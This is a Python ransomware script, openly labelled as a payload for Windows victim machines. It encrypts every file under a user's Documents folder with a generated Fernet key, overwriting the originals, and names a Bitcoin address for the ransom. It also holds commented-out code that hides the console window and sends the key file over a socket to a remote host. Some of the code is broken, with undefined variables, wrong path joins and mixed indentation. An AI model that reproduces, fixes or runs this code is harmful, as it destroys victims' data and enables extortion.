####################################
#		Ransom Ware
#		
###################################
#
#
#	This payload is intended 
#	for Windows machines
#	Do not run this executable on a non victim machine
#	
#	This binary will hold all contents 
#	of your computer hostage
#	Made with love and care,
#	 by yours truly <3
###################################

from cryptography.fernet import Fernet
import os
import ctypes
import socket
#from Tkinter import *

def curr_user():
	user = os.popen('whoami').read() #which user am i and strip just their name (no domain prefix)
	user = user.split("\\", 1)[-1]
	print(user)
	return user


def encrypt_all_dir(root_dir, key):
        print(root_dir)
        
        for dirName, subDirList, fileList in os.walk(root_dir):
                for file in fileList:
                        print(os.path.join(root_dir, file))
                        try:
                                o = open(os.path.join(root_dir, file), 'rb')
                        except PermissionError:
                                continue
                        except FileNotFoundError:
                                continue
                        o = open(os.path.join(root_dir, file), 'rb')
                        data = o.read()
                        o.close()
                        fernet = Fernet(key)
                        encrypted = fernet.encrypt(data)
                        print(encrypted)

                        try:
                                o = open(os.path.join(root_dir, file), 'wb')
                        except PermissionError:
                                continue
                        except FileNotFoundError:
                                continue
                        o = open(os.path.join(root_dir, file), 'wb')
                        o.write(encrypted)
                        o.close()

def send_file(file_name, host, port):

	BUFFER_SIZE = 4096

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	file_size = os.path.getsize(file_name)
	s.connect((host, port))

	s.send(f"{file_name}{seperator}{file_size}".encode())

	file = open(key_name, 'rb')
	l = file.read()
	s.sendall(l)
	file.close()

	s.close()

def main():
        btc_addr = '31q9PEB4if6qHX9xSif5UUe4J9pybFGcjM'
	#hide the console window
	#"""
	#kernel32 = ctypes.WinDLL('kernel32')
	#user32 = ctypes.WinDLL('user32')
	#SW_HIDE = 0
	#window = kernel32.GetConsoleWindow()
	#user32.ShowWindow(window, SW_HIDE)
	#"""
	#generate key then write a file named after the ip of the machine
	# file saved as xx-xx-xxx-xx.key
        key = Fernet.generate_key()
        key_name = "testing" #os.popen('nslookup myip.opendns.com. resolver1.opendns.com').read()
        key_name = key_name.replace('.', '-') + '.key'
        f = open(key_name, "wb")
        f.write(key)
        f.close()
        user = curr_user()
        target_dir = 'C:\\Users\\' + 'utkar\Documents' #user
        print(target_dir)
        print(key)
        encrypt_all_dir(target_dir, key)

	#send_file(key_name, '10.0.0.14', 10000)
	#delete the key file
	#os.remove(key_name)

if __name__ == "__main__":
	main()







